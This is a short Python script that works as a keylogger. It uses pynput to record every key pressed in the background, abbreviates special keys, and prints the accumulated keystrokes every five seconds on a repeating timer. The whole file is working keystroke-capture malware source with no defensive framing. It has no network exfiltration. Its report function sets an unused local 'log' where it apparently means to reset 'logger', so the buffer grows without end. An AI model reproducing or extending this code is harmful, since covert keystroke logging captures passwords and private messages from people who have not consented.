#!/usr/bin/env python

import pynput.keyboard
import threading

logger = ""

def process_key_press(key):
    global logger
    try:
        logger = logger + str(key.char)
    except AttributeError:
        if key == key.space:
            logger = logger + " Sp "
        elif key == key.enter:
            logger = logger + " Etr "
        elif key == key.tab:
            logger = logger + " Tb "
        elif key == key.backspace:
            logger = logger + " Bk "
        elif key == key.right:
            logger = logger + " rt "
        elif key == key.left:
            logger = logger + " lt "
        elif key == key.up:
            logger = logger + " up "
        elif key == key.down:
            logger = logger + " dn "
        else:
            logger = logger + " " + str(key) + " "

def report():
    global logger
    print(logger)
    log = ""
    timer = threading.Timer(5,report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
